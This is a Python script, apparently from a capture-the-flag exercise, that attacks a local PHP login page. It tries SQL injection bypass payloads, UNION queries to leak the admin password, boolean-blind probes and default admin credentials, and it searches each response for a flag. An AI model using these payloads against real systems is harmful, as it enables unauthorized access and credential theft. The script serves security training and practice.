import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("[HYPOTHESIS] Maybe successful admin login shows FLAG or redirects\n")

# The form specifies method="GET", so let's focus on GET
# But we need to find what makes someone "the admin"

# Let's try to understand the backend logic by testing edge cases
print("[TEST 1] Testing if empty username with SQL might work")
print("-"*80)

edge_payloads = [
    ("", ""),
    ("' OR ''='", "' OR ''='"),
    ("'='", "'='"),
    ("' OR username='admin'-- -", "x"),
    ("' OR username='admin' AND '1'='1", "x"),
]

for user, pwd in edge_payloads:
    params = {'username': user, 'password': pwd}
    resp = requests.get(target, params=params, allow_redirects=True)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"[!!! FLAG FOUND !!!]")
        print(f"Payload: username='{user}', password='{pwd}'")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    has_error = "not the admin" in resp.text.lower()
    print(f"[{'✗' if has_error else '?'}] user={user[:20]:20s} pwd={pwd[:20]:20s} | {'not admin' if has_error else f'NO ERROR (len={len(resp.text)})'}")

# Maybe we need to match an actual admin user in the database
print("\n[TEST 2] Try to extract and use real admin credentials")
print("-"*80)

# First, let's try to leak the admin password using UNION
leak_payloads = [
    # Try to get it to display in the error or page
    ("' UNION SELECT NULL,password,NULL FROM users WHERE username='admin'-- -", "x"),
    ("' UNION SELECT password,NULL,NULL FROM users WHERE username='admin'-- -", "x"),
    ("' UNION SELECT 1,2,password FROM users WHERE username='admin'-- -", "x"),
]

for user, pwd in leak_payloads:
    params = {'username': user, 'password': pwd}
    resp = requests.get(target, params=params)
    
    # Look for anything that doesn't match the standard "not the admin" response
    if len(resp.text) != 3173:
        print(f"[!] DIFFERENT LENGTH: {len(resp.text)}")
        print(f"Payload: {user}")
        print(f"Checking for flag...")
        
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        if flag_match:
            print(f"[!!! FLAG FOUND !!!]: {flag_match.group(0)}")
            print(resp.text)
            exit(0)
    
    print(f"[✗] {user[:70]:70s}")

# Let's try a boolean-based blind SQL injection to check if admin exists
print("\n[TEST 3] Check if specific admin username exists")
print("-"*80)

# These should all behave the same if 'admin' exists
boolean_tests = [
    ("admin' AND '1'='1'-- -", "should work if admin exists"),
    ("admin' AND '1'='2'-- -", "should fail"),
    ("admin' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0-- -", "check admin exists"),
]

for payload, desc in boolean_tests:
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    has_admin_error = "not the admin" in resp.text.lower()
    print(f"[{has_admin_error}] {desc:40s} | len={len(resp.text)}")

# Maybe the issue is we need to actually authenticate as a user first
# Let's try common default credentials
print("\n[TEST 4] Try default credentials + SQL injection")
print("-"*80)

common_creds = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("administrator", "administrator"),
]

for user, pwd in common_creds:
    # Try normal auth
    params = {'username': user, 'password': pwd}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"[!!! FLAG WITH NORMAL CREDS !!!]")
        print(f"Credentials: {user}:{pwd}")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    # Try with SQL injection in password
    params = {'username': user, 'password': "' OR '1'='1'-- -"}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"[!!! FLAG WITH SQL IN PASSWORD !!!]")
        print(f"Username: {user}, Password: ' OR '1'='1'-- -")
        print(f"Flag: {flag_match.group(0)}")
        print(f"\nFull Response:\n{resp.text}")
        exit(0)
    
    print(f"[✗] {user}:{pwd} - not admin")

print("\n[COMPLETE] Still no flag found")

